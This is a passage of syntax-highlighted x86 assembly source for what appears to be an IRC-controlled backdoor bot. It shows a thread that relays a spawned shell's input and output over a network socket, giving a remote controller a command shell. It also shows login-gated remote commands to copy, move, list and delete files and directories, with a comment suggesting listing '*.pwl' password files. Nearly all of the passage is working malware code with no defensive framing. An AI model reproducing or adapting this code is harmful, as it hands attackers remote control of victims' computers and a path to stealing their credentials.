            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_bot_shell</span><span class="sc0">

            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">citaj_shell_socket</span><span class="sc0">
    
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">__overflow</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">__overflow</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">read_handle_2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ReadFile</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_bot_shell</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_bot_shell</span><span class="sc0">
            
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pump_bot_shell</span><span class="sc0">

</span><span class="sc5">citaj_shell_socket</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wsocket</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_select</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_bot_shell</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">pump_bot_shell</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_recv</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_bot_shell</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_bot_shell</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">write_handle_1</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteFile</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pump_bot_shell</span><span class="sc0">

</span><span class="sc5">__end_bot_shell</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">lsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">processinfo.PI_hProcess</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_TerminateThread</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">write_handle_2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">write_handle_1</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">read_handle_2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">read_handle_1</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">processinfo.PI_hProcess</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">processinfo.PI_hThread</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            </span><span class="sc6">leave</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ExitThread</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">

</span><span class="sc5">__create_pipe</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; alloc SECURITY_ATTRIBUTES</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CreatePipe</span><span class="sc0"> </span><span class="sc5">sh</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">; free SECURITY_ATTRIBUTES</span><span class="sc0">
            
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">
            
</span><span class="sc5">bot_shell_thread</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; copies specified file</span><span class="sc0">
</span><span class="sc1">; format: !copy &lt;src&gt; &lt;dest&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_copy</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endcr</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CopyFileA</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_cmd_move</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endcr</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">MoveFileA</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; erazes specified empty directory</span><span class="sc0">
</span><span class="sc1">; format: !rmdir &lt;dirname&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_rmdir</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endcr</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">RemoveDirectoryA</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; creates specified directory</span><span class="sc0">
</span><span class="sc1">; format: !mkdir &lt;dirname&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_mkdir</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">
    
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchcr</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateDirectoryA</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; sets current directory</span><span class="sc0">
</span><span class="sc1">; format: !cd &lt;dir&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_cd</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endcr</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">    

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; print working directory</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_pwd</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MAX_PATH</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_privmsg</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">
            
            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; lists filez in current directory</span><span class="sc0">
</span><span class="sc1">; format: !ls &lt;wildcard&gt;</span><span class="sc0">
</span><span class="sc1">; ex: !ls *.* or !ls *.pwl</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_ls</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_cmd_syntax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchcr</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; param</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bot_ls_thread</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateThread</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_ls_thread</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">

            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">wildcard</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">wfd</span><span class="sc4">:</span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">search_handle</span><span class="sc0">
            
            </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">__dcc_ls_thread_end</span><span class="sc4">&gt;</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
